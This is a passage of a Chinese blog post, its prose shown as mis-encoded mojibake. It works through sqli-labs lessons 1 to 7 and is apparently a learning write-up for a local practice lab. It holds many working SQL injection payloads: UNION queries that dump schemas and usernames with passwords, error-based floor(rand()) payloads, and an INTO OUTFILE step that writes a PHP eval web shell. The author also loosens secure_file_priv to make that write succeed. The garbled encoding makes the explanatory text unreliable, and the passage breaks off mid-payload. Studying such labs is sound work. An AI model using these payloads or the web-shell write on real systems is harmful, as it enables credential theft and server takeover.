class=\"line\">çˆ†åº“ï¼Œä»mysqlé»˜è®¤çš„æ•°æ®åº“information_schemaé‡Œæ‰¾æ‰€æœ‰çš„æ•°æ®ï¼Œä½¿ç”¨group_concatæ‹¼æ¥ï¼š</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,database(),group_concat(schema_name) from information_schema.schemata %23</span><br><span class=\"line\">è¾“å‡ºï¼š</span><br><span class=\"line\">ç¬¬äºŒä¸ªå­—æ®µæ˜¯å½“å‰æ•°æ®åº“securityï¼Œç¬¬ä¸‰ä¸ªå­—æ®µæ˜¯è¾“å‡ºlocalhostæ‰€æœ‰çš„æ•°æ®åº“</span><br><span class=\"line\"></span><br><span class=\"line\">çˆ†è¡¨ï¼š</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema %23</span><br><span class=\"line\">è¾“å‡ºï¼š</span><br><span class=\"line\">Your Login name:emails,referers,uagents,users</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br><span class=\"line\">çˆ†å­—æ®µï¼š</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br><span class=\"line\">è¾“å‡ºï¼š</span><br><span class=\"line\">Your Login name:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br><span class=\"line\">çˆ†å­—æ®µå€¼ï¼š</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(concat_ws(&#x27;--&#x27;,id,username,password)),3 from users+%23</span><br><span class=\"line\">è¾“å‡ºï¼š</span><br><span class=\"line\">Your Login name:1--Dumb--Dumb,2--Angelina--I-kill-you,3--Dummy--p@ssword,4--secure--crappy,5--stupid--stupidity,6--superman--genious,7--batman--mob!le,8--admin--admin,9--admin1--admin1,10--admin2--admin2,11--admin3--admin3,12--dhakkan--dumbo,14--admin4--admin4</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"æ€»ç»“\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“\">#</a> æ€»ç»“</h2>\n<ol>\n<li>è™½ç„¶æˆ‘è§‰å¾—é—­åˆå¼•å·å¾ˆéº»çƒ¦ï¼Œä½†æ˜¯æˆ‘å°±æ˜¯è¿˜æ˜¯æƒ³å»è¯•ä¸€ä¸‹ï¼Œç›´æ¥åœ¨æœ€åé—­åˆå°±å¯ä»¥äº†ï¼Œä¹Ÿä¸ä¼šæŠ¥è¯­æ³•é”™</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&quot; order by 3 &quot;</span><br></pre></td></tr></table></figure>\n<p>â€‹\t\té‚£ä¸ºä»€ä¹ˆå¤§å®¶é—­åˆçš„æ—¶å€™éƒ½å–œæ¬¢ç”¨</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>\n<p>ç”»é¢æ„Ÿåœ°ç†è§£ä¸€ä¸‹å‡½æ•°</p>\n<p>concat_ws () æ˜¯æ‹¼æ¥ä¸€è¡Œçš„æ•°æ®</p>\n<p>group_concat () æ˜¯æ‹¼æ¥ä¸€åˆ—çš„æ•°æ®</p>\n</li>\n<li>\n<p>å› ä¸º sql å­¦çš„å°±å¾ˆèœï¼Œæœ‰äº›è¯­æ³•å‡½æ•°ä»€ä¹ˆçš„è¿˜è¦ç™¾åº¦ï¼Œmysql é‡Œ information_schema é‡Œçš„ï¼Œå¾ˆå¤šè¡¨åå’Œå­—æ®µåç»å¸¸ææ··ï¼Œæ‰‹å·¥æ³¨å…¥çš„æ—¶å€™è¿˜è¦å»çœ‹å…·ä½“çš„è¡¨åå’Œå­—æ®µåï¼Œè¶…çº§æµªè´¹æ—¶é—´çš„ï¼Œå¯æ˜¯è®°ä¸€ä¸‹å§å¾ˆä¹…ä¸å†™åˆå¿˜è®°äº†ï¼Œè€Œä¸”æ•°æ®åº“é‚£ä¹ˆå¤šï¼Œé»˜è®¤çš„è¡¨éƒ½ä¸ä¸€æ ·ï¼Œè¿˜æ˜¯å¤šå†™é¢˜ 8</p>\n</li>\n<li>\n<p>è·‘ sqlmap çš„æ—¶å€™ï¼Œä¼šç»™å‡ºç›¸åº”çš„ payloadï¼Œæœ‰äº›å†™å¾—çœŸçš„è¶…çº§å¤æ‚ï¼Œè¯´æ˜¯ä¸ºäº†ç»•è¿‡æŠŠï¼Œå¯æ˜¯æœ‰ä¸ª select å°±æ„Ÿè§‰ç»•ä¸è¿‡å»å‘€ï¼Œç­‰æœ‰ä¸€å¤©æˆ‘ä¸å†æ˜¯ä¸€ä¸ªè¿è„šæœ¬éƒ½ä¸ä¼šç”¨çš„èœé¸¡äº†ï¼Œæœ‰æœºä¼šçš„è¯ï¼Œæƒ³å»ç ”è¯»ä¸€ä¸‹æºç </p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-2\"><a class=\"markdownIt-Anchor\" href=\"#less-2\">#</a> Less-2</h1>\n<p>data: 2020-11-17 10:32:43</p>\n<h2 id=\"è¿‡ç¨‹-2\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-2\">#</a> è¿‡ç¨‹</h2>\n<p>å’Œ less-1 ç›¸æ¯”å°±æ˜¯å°‘é—­åˆäº†ä¸¤ä¸ªå¼•å·ç½¢äº†</p>\n<h3 id=\"sqlmap-2\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-2\">#</a> sqlmap</h3>\n<p>åŒ Less-1</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-2\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-2\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>åˆ¤æ–­ id æ˜¯æ³¨å…¥ç‚¹ä¸”éœ€è¦ä¸‰ä¸ªå­—æ®µï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:http://www.sqli-labs.com/Less-2?id=1 order by 4è¾“å‡ºï¼šUnknown column &#x27;4&#x27; in &#x27;order clause&#x27;payload:http://www.sqli-labs.com/Less-2?id=1 order by 3è¾“å‡ºï¼šYour Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>å’Œ less-1 ä¸€æ ·ä¸€å¥—æµç¨‹ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">çˆ†åº“ï¼Œç¬¬äºŒä¸ªå­—æ®µæ‹¼æ¥æ”¹è¿æ¥æ‰€æœ‰æ•°æ®åº“åï¼šhttp://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemataçˆ†å½“å‰æ•°æ®åº“çš„è¡¨ï¼šhttp://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schemaçˆ†å­—æ®µï¼šhttp://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;çˆ†å­—æ®µå€¼ï¼šhttp://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users</span><br></pre></td></tr></table></figure>\n<h2 id=\"æ€»ç»“-2\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-2\">#</a> æ€»ç»“</h2>\n<p>æƒ³å½“å¹´æˆ‘è¿˜æ˜¯ä¸ªä¸ç®¡å†™ä»€ä¹ˆé¢˜ç›®éƒ½è¦çœ‹é€šå…³æ‰‹å†Œçš„äººï¼Œé¼“æŒï¼ï¼ï¼</p>\n<hr>\n<h1 id=\"less-3\"><a class=\"markdownIt-Anchor\" href=\"#less-3\">#</a> Less-3</h1>\n<p>date:2020-11-17 11:00:04</p>\n<h2 id=\"è¿‡ç¨‹-3\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-3\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-3\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-3\">#</a> sqlmap</h3>\n<p>åŒ Less-1</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-3\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-3\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>åŠ å•å¼•å·æŠ¥é”™ï¼Œçœ‹åé¢å…·ä½“è¦é—­åˆå•¥</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-3?id=1asdf&#x27;kkkk</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼Œå‘ç°åé¢æœ‰æ‹¬å·å•¥çš„é—­åˆä¸€ä¸‹ï¼Œå¹¶ä¸” id ä¹Ÿæ˜¯å­—ç¬¦å‹çš„ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;kkkk&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>æ ¹æ® order by åˆ¤æ–­éœ€è¦çš„å­—æ®µæ•°æ˜¯ 3 ä¸ª</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 4 --+http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 3 --+</span><br></pre></td></tr></table></figure>\n<p>è„±è„±è„±ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">çˆ†åº“ï¼Œç¬¬äºŒä¸ªå­—æ®µæ‹¼æ¥æ”¹è¿æ¥æ‰€æœ‰æ•°æ®åº“åï¼šhttp://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+çˆ†å½“å‰æ•°æ®åº“çš„è¡¨ï¼šhttp://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+çˆ†å­—æ®µï¼šhttp://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+çˆ†å­—æ®µå€¼ï¼šhttp://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure>\n<h2 id=\"æ€»ç»“-3\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-3\">#</a> æ€»ç»“</h2>\n<p>?id=1&quot; ç«Ÿç„¶æ­£å¸¸è¿”å›ä¿¡æ¯äº†ï¼ï¼ï¼</p>\n<p>å› ä¸º id=xx (â€˜1&quot;â€™) äº†å•Šï¼Œæ ¹æœ¬æ²¡é—­åˆå•Šï¼Œæœ‰ç‚¹å¼±æ™ºå“¦</p>\n<hr>\n<h1 id=\"less-4\"><a class=\"markdownIt-Anchor\" href=\"#less-4\">#</a> Less-4</h1>\n<p>date:2020-11-17 11:25:45</p>\n<h2 id=\"è¿‡ç¨‹-4\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-4\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-4\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-4\">#</a> sqlmap</h3>\n<p>åŒ Less-1</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-4\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-4\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>å‘ç°åŒå¼•å·æŠ¥é”™ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åœ¨åé¢åŠ  &quot;) %23+ è¿›è¡Œé—­åˆ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-4?id=1&quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>æ ¹æ® order by ç¡®å®šæ˜¯ä¸‰ä¸ªå­—æ®µåï¼Œunion select æ‹¿æ•°æ®</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">çˆ†åº“ï¼Œç¬¬äºŒä¸ªå­—æ®µæ‹¼æ¥æ”¹è¿æ¥æ‰€æœ‰æ•°æ®åº“åï¼šhttp://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+çˆ†å½“å‰æ•°æ®åº“çš„è¡¨ï¼šhttp://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+çˆ†å­—æ®µï¼šhttp://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+çˆ†å­—æ®µå€¼ï¼šhttp://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure>\n<h2 id=\"æ€»ç»“-4\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-4\">#</a> æ€»ç»“</h2>\n<p>æ²¡å•¥å¥½è¯´çš„</p>\n<hr>\n<h1 id=\"less-5\"><a class=\"markdownIt-Anchor\" href=\"#less-5\">#</a> Less-5</h1>\n<p>date:2020-11-17 11:48:40</p>\n<h2 id=\"è¿‡ç¨‹-5\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-5\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-5\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-5\">#</a> sqlmap</h3>\n<p>åŒ Less-1</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-5\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-5\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>å•å¼•å·æŠ¥é”™ï¼Œpayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>â€˜â€˜1â€™â€™ LIMIT 0,1â€™ç¬¬ä¸€ä¸ªå•å¼•å·çœŸçš„å·¨å‘ï¼Œæ€»æ˜¯çœ¼ç³Šçœ‹é”™æˆ SQL è¯­å¥é‡Œé¢çš„</p>\n<p>é—­åˆå•å¼•å·ï¼Œç”¨ order by ç¡®å®šæ˜¯æå–äº†ä¸‰ä¸ªå­—æ®µï¼Œä½†æ˜¯é¡µé¢ä¸Šå¹¶æ²¡æœ‰è¾“å‡ºå­—æ®µçš„å€¼ï¼Œç›®æµ‹æ˜¯åå°è¿›è¡Œäº†åˆ¤æ–­</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27; order by 3 +%23+è¾“å‡ºï¼šYou are in...........</span><br></pre></td></tr></table></figure>\n<p>å‰ç«¯æ²¡æœ‰å‘ç°å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ’¸äº†ä¸€ä¸‹ floor æŠ¥é”™ï¼Œå¼€å¹²</p>\n<p>çˆ†åº“ payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>ç„¶ååƒä»¥å‰ä¸€æ ·çš„æµç¨‹ï¼Œåœ¨ concat é‡Œé¢æ‰¾è‡ªå·±è¦çš„æ•°æ®å°±å¥½äº†</p>\n<h2 id=\"æ€»ç»“-5\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-5\">#</a> æ€»ç»“</h2>\n<ol>\n<li>\n<p><a href=\"https://www.cnblogs.com/litlife/p/8472323.html\">select count (*) from test group by floor (rand (0)*2) æŠ¥é”™åŸç† 666</a></p>\n<p>æ¦‚æ‹¬ä¸€ä¸‹:</p>\n<p>floor (rand (0)*2) æ˜¯éšæœº 0ã€1ï¼Œä½†æ˜¯æ˜¯ä¼ªéšæœº 011011â€¦</p>\n<p>count (*) ä¸ group by å…±åŒå·¥ä½œæ—¶ä¼šå»ºç«‹ä¸€å¼ è™šæ‹Ÿè¡¨ï¼Œä¸¤ä¸ªå­—æ®µ (å…³é”®å­—å’Œæ•°é‡)</p>\n<p>floor è¡¨è¾¾å¼ç¬¬ä¸€æ¬¡è¿ç®—çš„å€¼ä¸º 0ï¼Œåœ¨è¡¨ä¸­æ²¡æœ‰æ‰¾åˆ° key ä¸º 0 çš„æ•°æ®ï¼Œæ•…æ’å…¥ï¼Œåœ¨æ’å…¥çš„è¿‡ç¨‹ä¸­éœ€è¦å†å–ä¸€æ¬¡ group by åé¢çš„å€¼ï¼ˆå³å†è¿›è¡Œä¸€æ¬¡ floor è¿ç®—ï¼Œç»“æœä¸º 1ï¼‰ï¼Œå–åˆ°äº† 1ï¼Œå°†ä¹‹æ’å…¥ï¼Œå¹¶å°† count (*) ç½® 1ã€‚</p>\n<p>ä¹Ÿå°±æ˜¯è¯´ä¸€æ¬¡æ’å…¥è¦è°ƒç”¨ä¸¤æ¬¡ floorï¼Œæ‰€ä»¥åœ¨åé¢ç¢°è§ 01 æ—¶ï¼Œ0 æ²¡æœ‰ï¼Œæ’å…¥ 1ï¼Œä½†æ˜¯ 1 å·²ç»å­˜åœ¨ï¼ŒæŠ¥é”™</p>\n</li>\n<li>\n<p>payload æ˜¯ sqlmap å¤åˆ¶åä¿®æ”¹çš„ï¼Œè‡ªå·±æ‰‹åŠ¨è¾“å…¥çš„æ€»æ˜¯è¯´æœ‰è¯­æ³•é”™ï¼Œæˆ‘å¯¹ç€çœ‹äº†å¥½å¤šéæ„Ÿè§‰æ²¡æœ‰ä»€ä¹ˆé—®é¢˜å•Šï¼Œæ— ç†å–é—¹ï¼Œåæ¥çœ‹æŠ¥é”™åº”è¯¥æ˜¯ and åé¢çš„ select from çš„è¡¨è¦åˆ«å (Every derived table must have its own alias)ï¼Œselect from å¤–é¢è¿˜è¦åŠ ä¸€ä¸ªæ‹¬å·</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-6\"><a class=\"markdownIt-Anchor\" href=\"#less-6\">#</a> Less-6</h1>\n<p>data: 2020-11-17 15:50:40</p>\n<h2 id=\"è¿‡ç¨‹-6\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-6\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-6\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-6\">#</a> sqlmap</h3>\n<p>åŒ Less-1</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-6\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-6\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>è¾“å…¥äº† less-5 é‡Œé¢çš„ payloadï¼Œå‘ç°ä¸æŠ¥é”™äº†ï¼</p>\n<p>æœºæ™ºçš„æˆ‘å»çœ‹ sqlmap å‘ç°å°±æ˜¯å˜æˆäº†é—­åˆåŒå¼•å·ç½¢äº†å”‰ï¼Œäººå‚»äº†</p>\n<p>çˆ†å½“å‰åº“ payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-6?id=1&quot; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&quot;1</span><br></pre></td></tr></table></figure>\n<p>CONCAT (payload,floor (rand (0)*2)) ä½œä¸º group by çš„ key</p>\n<h2 id=\"æ€»ç»“-6\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-6\">#</a> æ€»ç»“</h2>\n<p>æ²¡å•¥å¥½æ€»ç»“çš„ï¼Œè¿˜ä»¥ä¸ºåˆæœ‰æ–°ä¸œè¥¿å¯ä»¥çœ‹äº†</p>\n<hr>\n<h1 id=\"less-7\"><a class=\"markdownIt-Anchor\" href=\"#less-7\">#</a> Less-7</h1>\n<p>date:2020-11-17 16:09:39</p>\n<h2 id=\"è¿‡ç¨‹-7\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-7\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-7\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-7\">#</a> sqlmap</h3>\n<p>åŒ Less-1</p>\n<p>sqlmap ç”¨çš„æ—¶é—´ç›²æ³¨ï¼Œå®ƒè‡ªå·±è·‘ç€è·‘ç€è¿æ¥å°±æ–­äº†ï¼Œç¬‘æ­»</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-7\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-7\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>è¯•äº†ä¸€äº›ï¼Œç›®æµ‹åå°åšäº†åˆ¤æ–­</p>\n<p>sql æŠ¥é”™ç»Ÿä¸€è¾“å‡ºï¼š</p>\n<p>You have an error in your SQL syntax</p>\n<p>æ­£å¸¸è¾“å‡ºï¼šYou are inâ€¦ Use outfileâ€¦</p>\n<p>ç›²æ³¨çš„è¯ï¼ŒäºŒåˆ†æ³•åˆ¤æ–­å­—ç¬¦çš„ ascii ç å€¼ï¼Œsqlmap éƒ½è¯´å®ƒæ‰›ä¸ä½äº†</p>\n<p>çœ‹è§æ­£å¸¸è¾“å‡ºé‚£é‡Œæœ‰ä¸ª use outfileâ€¦ï¼Œæ„Ÿè§‰æ˜¯ä¸ªæç¤ºï¼Œæ–°ä¸œè¥¿å°±è¦ç™¾åº¦çœ‹çœ‹ï¼Œå¥½å­è¿™é‡Œç›´æ¥çœ‹é€šå…³ç§˜ç±äº†ï¼Œç«Ÿç„¶ç›´æ¥å†™å…¥æ–‡ä»¶ getshell äº†â€¦</p>\n<p>å¤ªå¸…äº†ï¼ŒåŠ¨æ‰‹æ’¸ä¸€é</p>\n<p>è¦ä¸Šä¼ ä¸€å¥è¯è¿æ¥çš„è¯ï¼Œéœ€è¦çŸ¥é“è·¯å¾„ï¼Œå»æœ‰å›æ˜¾çš„é¢˜æ‹¿è·¯å¾„å•¦</p>\n<p>basedir å‚æ•°æŒ‡å®šäº†å®‰è£… MySQL çš„å®‰è£…è·¯å¾„</p>\n<p>datadir å‚æ•°æŒ‡å®šäº† MySQL çš„æ•°æ®åº“æ–‡ä»¶æ”¾åœ¨ä»€ä¹ˆè·¯å¾„ä¸‹</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/?id=-1&#x27; union select 1,@@datadir,@@basedir MYSQL %23+</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼Œå¹¶æ²¡æœ‰ phpstudy çš„è·¯å¾„ï¼Œå› ä¸ºæˆ‘æ ¹æœ¬æ²¡ç”¨ phpstudy çš„æ•°æ®åº“â€¦ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:C:\\ProgramData\\MySQL\\MySQL Server 5.5\\Data\\Your Password:C:/Program Files (x86)/MySQL/MySQL Server 5.5/</span><br></pre></td></tr></table></figure>\n<p>å°è¯•åœ¨è·å–åˆ°çš„è·¯å¾„ä¸‹å­˜å…¥ php ä¸€å¥è¯ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7/?id=1 union select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/ProgramData/MySQL/MySQL Server 5.5/Data/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>ä½†æ˜¯ä¸€ç›´æŠ¥é”™ï¼Œæ„¤æ€’åœ°ç›´æ¥å» mysql è¿è¡Œçš„æ—¶å€™ï¼Œå‘ç°æŠ¥é”™ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[SQL] select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/haha.php&#x27;[Err] 1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>\n<p>å»æŸ¥äº†ä¸€ä¸‹æŠ¥é”™åŸå› ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å°†æ¡Œé¢æ–‡ä»¶å­˜å‚¨åˆ°mysqlæ—¶æŠ¥é”™ï¼šThe MySQL server is running with the --secure-file-pri option so it cannot execute this.</span><br><span class=\"line\">æŠ¥é”™åŸå› ï¼šmysqlæ–‡ä»¶çš„å¯¼å…¥å’Œå¯¼å‡ºè·¯å¾„æœ‰é»˜è®¤çš„è®¾ç½®ï¼Œå³ secure-file-priv,å½“ä¼ å…¥çš„csvæ–‡ä»¶è·¯å¾„ä¸é»˜è®¤çš„è·¯å¾„å†²çªæ—¶å°±ä¼šæŠ¥é”™ã€‚</span><br><span class=\"line\">secure-file-privçš„å€¼æœ‰ä¸‰ç§æƒ…å†µï¼šsecure_file_prive=null â€“â€“é™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥å¯¼å‡º</span><br><span class=\"line\">secure_file_priv=/path/ â€“ --é™åˆ¶mysqldçš„å¯¼å…¥å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨é»˜è®¤çš„/path/ç›®å½•ä¸‹</span><br><span class=\"line\">secure_file_priv=â€™â€™ â€“ --ä¸å¯¹mysqld çš„å¯¼å…¥ å¯¼å‡ºåšé™åˆ¶</span><br></pre></td></tr></table></figure>\n<p>é€šè¿‡å‘½ä»¤  <code>select @@secure_file_priv</code>  æŸ¥è¯¢ï¼Œå‘ç° secure_file_priv çš„å€¼ä¸º nullï¼Œä¹Ÿå°±æ˜¯è¯´ä¸å…è®¸å¯¼å…¥å¯¼å‡º</p>\n<p>äºæ˜¯åˆ° mysql çš„å®‰è£…ç›®å½•ä¸‹ä¿®æ”¹ my.ini é…ç½®æ–‡ä»¶ï¼Œåœ¨ mysqld èŠ‚ç‚¹ä¸‹åŠ å…¥ secure_file_priv=â€™â€™ï¼Œå¯¹å¯¼å…¥å¯¼å‡ºä¸è¿›è¡Œé™åˆ¶</p>\n<p>åœ¨å°è¯• payload æ—¶ï¼Œ</p>\n<p>?id=1 order by 111111 %23 + ä¸æŠ¥é”™</p>\n<p>?id=1â€™ order by 111111 %23 + æŠ¥é”™</p>\n<p>?id=1&quot; order by 111111 %23 + ä¸æŠ¥é”™</p>\n<p>è¯´æ˜æœ‰ä¸€ä¸ªå•å¼•å·è¦é—­åˆ</p>\n<p>?id=1â€™ order by 1 %23 + æŠ¥é”™</p>\n<p>?id=1â€™)) order by 3 %23 + 